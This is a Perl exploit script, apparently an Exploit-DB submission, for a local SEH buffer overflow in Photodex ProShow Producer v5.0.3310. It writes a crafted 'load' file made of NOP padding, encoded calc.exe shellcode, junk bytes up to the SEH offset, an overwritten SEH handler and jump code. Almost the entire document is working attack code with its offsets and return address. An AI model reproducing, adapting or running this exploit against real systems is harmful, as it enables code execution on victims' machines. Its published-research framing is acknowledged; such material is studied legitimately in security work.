#!/usr/bin/perl

########################################################################################
# Exploit Title: Photodex ProShow Producer v5.0.3310 - Local Buffer Overflow (SEH)
# Date: 10-26-2013
# Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software: Photodex ProShow Producer v5.0.3310
# Software Link: http://files.photodex.com/release/pspro_50_3310.exe
# Version: 5.0.3310
# Tested On: Windows XP SP3
########################################################################################
# Credits:
# 
# Vulnerability identified in v5.0.3256
# 	 	by Julien Ahrens 
# 		http://www.exploit-db.com/exploits/19563/
#
# Egghunter SEH exploit for v5.0.3256 
# 		by mr.pr0n 
#		http://www.exploit-db.com/exploits/20036/
########################################################################################
# Details:
# Latest Proshow version confirmed still vulnerable (same offets as exploit by mr.pron)
# This sploit uses a jump to an offset of ESP instead of an egghunter
# The seh exploit looks like this:  shellcode-->junk-->next seh-->seh-->jumpcode
# Replace load file in app folder (e.g. C:\Program Files\Photodex\ProShow Producer)
########################################################################################

my $buffsize = 15000; # keep size of exploit buffer consistent

my $shell = "\x90" x 100; # since we're jumping ~60 bytes past the start of our buffer
			  # start the shellcode with enough nops

# Calc.exe payload [size 227]
# msfpayload windows/exec CMD=calc.exe R | 
# msfencode -e x86/shikata_ga_nai -c 1 -b '\x00\x0a\x0d\xff'
my $shell = $shell . "\xdb\xcf\xb8\x27\x17\x16\x1f\xd9\x74\x24\xf4\x5f\x2b\xc9" .
"\xb1\x33\x31\x47\x17\x83\xef\xfc\x03\x60\x04\xf4\xea\x92" .
"\xc2\x71\x14\x6a\x13\xe2\x9c\x8f\x22\x30\xfa\xc4\x17\x84" .
"\x88\x88\x9b\x6f\xdc\x38\x2f\x1d\xc9\x4f\x98\xa8\x2f\x7e" .
"\x19\x1d\xf0\x2c\xd9\x3f\x8c\x2e\x0e\xe0\xad\xe1\x43\xe1" .
"\xea\x1f\xab\xb3\xa3\x54\x1e\x24\xc7\x28\xa3\x45\x07\x27" .
"\x9b\x3d\x22\xf7\x68\xf4\x2d\x27\xc0\x83\x66\xdf\x6a\xcb" .
"\x56\xde\xbf\x0f\xaa\xa9\xb4\xe4\x58\x28\x1d\x35\xa0\x1b" .
"\x61\x9a\x9f\x94\x6c\xe2\xd8\x12\x8f\x91\x12\x61\x32\xa2" .
"\xe0\x18\xe8\x27\xf5\xba\x7b\x9f\xdd\x3b\xaf\x46\x95\x37" .
"\x04\x0c\xf1\x5b\x9b\xc1\x89\x67\x10\xe4\x5d\xee\x62\xc3" .
"\x79\xab\x31\x6a\xdb\x11\x97\x93\x3b\xfd\x48\x36\x37\xef" .
"\x9d\x40\x1a\x65\x63\xc0\x20\xc0\x63\xda\x2a\x62\x0c\xeb" .
"\xa1\xed\x4b\xf4\x63\x4a\xa3\xbe\x2e\xfa\x2c\x67\xbb\xbf" .
"\x30\x98\x11\x83\x4c\x1b\x90\x7b\xab\x03\xd1\x7e\xf7\x83" .
"\x09\xf2\x68\x66\x2e\xa1\x89\xa3\x4d\x24\x1a\x2f\xbc\xc3" .
"\x9a\xca\xc0";

my $junk = "\x41" x (9844 - length($shell)); # 9844 is the offset to nseh
my $nseh = "\xeb\x08\x90\x90"; # overwrite next seh with jmp instruction
my $seh = pack('V',0x1022adc9); # overwrite seh handler with pop ebx pop eax ret  
                                # ASLR: False, Rebase: False, SafeSEH: False, OS: False 
                                # C:\Program Files\Photodex\ProShow Producer\if.dnt

# we don't have enough space to execute shellcode after the nseh jump
# there is enough space at esp + 1041 which points back to the beginning
# of our buffer so we'll use this limited spaceto increment esp and jump to it

my $jmp = "\x90" x 20; # start the jmp code with some nops 
my $jmp = $jmp . "\x41\x41"; # align so add esp executes properly
my $jmp = $jmp . "\x83\xc4\x64" x 11; # increment esp before we jump to it; (add esp, 100) x 11 = esp + 1100 
my $jmp = $jmp . "\xff\xe4"; # jmp esp

my $sploit = $shell.$junk.$nseh.$seh.$jmp; # concatenate the sploit portion of the buffer
my $fill = "\x42" x ($buffsize - length($sploit)); # fill the remainder of the buffer with junk to keep it consistent
my $buffer = $sploit.$fill; # build the final buffer

# write the exploit buffer to file
my $file = "load";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n"; 
